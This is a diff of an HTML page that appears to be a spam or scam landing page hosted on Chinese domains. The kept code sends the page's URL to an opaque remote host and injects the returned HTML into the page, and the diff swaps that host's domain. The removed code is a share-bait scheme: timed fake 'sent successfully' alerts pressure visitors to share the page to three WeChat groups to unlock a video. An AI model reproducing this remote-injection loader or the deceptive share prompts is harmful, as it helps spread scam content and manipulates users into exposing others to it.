@@ -11,36 +11,12 @@
             <script src='http://cdn.fdel.com.cn/Public/njs/a123.js?v=21'></script>
         </head>
         <body>
-                <div id='content'>
-                </div>
-                <div id='shareI'  class='share-guide modal' style='display:block;'>
-                        <img src='http://cdn0.fdel.com.cn/Public/images/5ee43f43gw1f49r1qwhmej20b40jrt90.jpg' style='width: 100%;'/>
-                </div>
+                <div id='content'></div>
                 <script>
                         var sb = encodeURIComponent(window.location.href);
-                        $.getJSON('http://sex21.vonxk.cn/adyyii/rzouxd/loadshow?domain='+sb+"&jsoncallback=?", function(result){
+                        $.getJSON('http://api.oimqz.cn/adyyii/rzouxd/loadshow?domain='+sb+"&jsoncallback=?", function(result){
                                 $('#content').html(result);
                         });
-                        function GetQueryString(name)
-                        {
-                                 var reg = new RegExp('(^|&)'+ name +'=([^&]*)(&|$)');
-                                 var r = window.location.search.substr(1).match(reg);
-                                 if(r!=null)return  unescape(r[2]); return null;
-                        }
-
-                        if(document.referrer && GetQueryString('n')>0)
-                        {
-                                setTimeout(function(){alert('发送成功!发送3个不同【微信群】即可观看視頻,当前还剩【2】次分享!');},10000);
-                                setTimeout(function(){alert('发送成功!发送3个不同【微信群】即可观看視頻,当前还剩【1】次分享!');},20000);
-                                setTimeout(function(){
-                                        $('#shareI').hide();
-                                        $('#neirong').html($('#neirong_v').html());
-                                },30000);
-                        }else
-                        {
-                                $('#shareI').hide();
-                        }
                 </script>
-
         </body>
 </html>
